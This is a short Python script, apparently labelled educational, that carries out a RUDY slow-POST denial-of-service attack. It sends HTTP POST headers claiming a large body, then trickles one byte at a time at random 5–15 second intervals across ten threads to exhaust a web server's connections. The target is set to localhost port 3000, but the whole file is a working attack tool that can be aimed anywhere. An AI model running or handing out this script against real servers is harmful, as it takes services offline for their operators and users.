import socket
import random
import time
import threading

def rudy_attack(target_ip, target_port, target_path, total_duration):
    # Initialize socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    # HTTP headers to initiate POST request
    headers = f"POST {target_path} HTTP/1.1\r\n"
    headers += "Host: {}\r\n".format(target_ip)
    headers += "User-Agent: rudy-educational-tool\r\n"
    headers += "Content-Length: 1000000\r\n"
    headers += "Content-Type: application/x-www-form-urlencoded\r\n"
    headers += "Connection: keep-alive\r\n\r\n"

    # Send headers to the server
    s.send(headers.encode())

    start_time = time.time()
    
    # Send payload in small chunks indefinitely or for a given duration
    while time.time() - start_time < total_duration:
        chunk = "A"  # Sending one byte of data
        s.send(chunk.encode())
        # Wait for a random interval between 5 and 15 seconds
        time.sleep(random.uniform(5, 15))
    
    # Close the socket after the attack
    s.close()

def start_attack_thread(target_ip, target_port, target_path, total_duration):
    thread = threading.Thread(target=rudy_attack, args=(target_ip, target_port, target_path, total_duration))
    thread.start()
    return thread

# Parameters
target_ip = "127.0.0.1"
target_port = 3000
target_path = "/"
total_duration = 60 * 5  # Run for 5 minutes
num_threads = 10  # Number of threads to simulate distributed attack

# Start multiple threads to simulate a distributed attack
threads = []
for _ in range(num_threads):
    thread = start_attack_thread(target_ip, target_port, target_path, total_duration)
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()
